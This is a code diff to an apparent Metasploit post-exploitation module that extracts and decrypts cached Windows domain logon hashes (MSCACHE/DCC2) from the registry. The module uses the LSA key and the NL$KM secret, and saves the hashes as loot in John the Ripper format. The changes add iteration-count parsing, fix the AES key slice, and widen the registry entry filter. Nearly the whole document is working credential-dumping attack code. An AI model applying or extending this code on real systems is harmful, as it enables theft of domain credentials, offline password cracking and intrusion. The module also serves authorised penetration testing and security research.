@@ -1,10 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
 
@@ -63,6 +62,15 @@ class MetasploitModule < Msf::Post
 
     vprint_good "Username\t\t: #{username}"
     vprint_good "Hash\t\t: #{hash.unpack("H*")[0]}"
+
+    if lsa_vista_style?
+      if (s.iterationCount > 10240)
+        iterationCount = s.iterationCount & 0xfffffc00
+      else
+        iterationCount = s.iterationCount * 1024
+      end
+      vprint_good "Iteration count\t: #{s.iterationCount} -> real #{iterationCount}"
+    end
 
     last = Time.at(s.lastAccess)
     vprint_good "Last login\t\t: #{last.strftime("%F %T")} "
@@ -152,6 +160,7 @@ class MetasploitModule < Msf::Post
         [
           username,
           hash.unpack("H*")[0],
+          iterationCount,
           logonDomainName,
           dnsDomainName,
           last.strftime("%F %T"),
@@ -168,7 +177,7 @@ class MetasploitModule < Msf::Post
 
     vprint_good "----------------------------------------------------------------------"
     if lsa_vista_style?
-      return "#{username.downcase}:$DCC2$##{username.downcase}##{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
+      return "#{username.downcase}:$DCC2$#{iterationCount}##{username.downcase}##{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
     else
       return "#{username.downcase}:M$#{username.downcase}##{hash.unpack("H*")[0]}:#{dnsDomainName}:#{logonDomainName}\n"
     end
@@ -195,6 +204,7 @@ class MetasploitModule < Msf::Post
       :revision,
       :sidCount,
       :valid,
+      :iterationCount,
       :sifLength,
       :logonPackage,
       :dnsDomainNameLength,
@@ -228,7 +238,8 @@ class MetasploitModule < Msf::Post
 
     s.revision = cache_data[40,4].unpack("V")[0]
     s.sidCount = cache_data[44,4].unpack("V")[0]
-    s.valid = cache_data[48,4].unpack("V")[0]
+    s.valid = cache_data[48,2].unpack("v")[0]
+    s.iterationCount = cache_data[50,2].unpack("v")[0]
     s.sifLength = cache_data[52,4].unpack("V")[0]
 
     s.logonPackage  = cache_data[56,4].unpack("V")[0]
@@ -253,7 +264,7 @@ class MetasploitModule < Msf::Post
 
   def decrypt_hash_vista(edata, nlkm, ch)
     aes = OpenSSL::Cipher.new('aes-128-cbc')
-    aes.key = nlkm[16...-1]
+    aes.key = nlkm[16...32]
     aes.padding = 0
     aes.decrypt
     aes.iv = ch
@@ -275,6 +286,7 @@ class MetasploitModule < Msf::Post
     [
       "Username",
       "Hash",
+      "Hash iteration count",
       "Logon Domain Name",
       "DNS Domain Name",
       "Last Login",
@@ -319,7 +331,7 @@ class MetasploitModule < Msf::Post
 
       vprint_status("Lsa Key: #{lsakey.unpack("H*")[0]}")
 
-      print_status("Obtaining LK$KM...")
+      print_status("Obtaining NL$KM...")
       nlkm = capture_nlkm(lsakey)
       vprint_status("NL$KM: #{nlkm.unpack("H*")[0]}")
 
@@ -329,7 +341,7 @@ class MetasploitModule < Msf::Post
       john = ""
 
       ok.enum_value.each do |usr|
-        if( "NL$Control" == usr.name) then
+        if ( !usr.name.match(/^NL\$\d+$/) ) then
           next
         end
 
@@ -362,13 +374,13 @@ class MetasploitModule < Msf::Post
       if lsa_vista_style?
         print_status("Hash are in MSCACHE_VISTA format. (mscash2)")
         p = store_loot("mscache2.creds", "text/csv", session, @credentials.to_csv, "mscache2_credentials.txt", "MSCACHE v2 Credentials")
-        print_status("MSCACHE v2 saved in: #{p}")
+        print_good("MSCACHE v2 saved in: #{p}")
 
         john = "# mscash2\n" + john
       else
         print_status("Hash are in MSCACHE format. (mscash)")
         p = store_loot("mscache.creds", "text/csv", session, @credentials.to_csv, "mscache_credentials.txt", "MSCACHE v1 Credentials")
-        print_status("MSCACHE v1 saved in: #{p}")
+        print_good("MSCACHE v1 saved in: #{p}")
         john = "# mscash\n" + john
       end
 
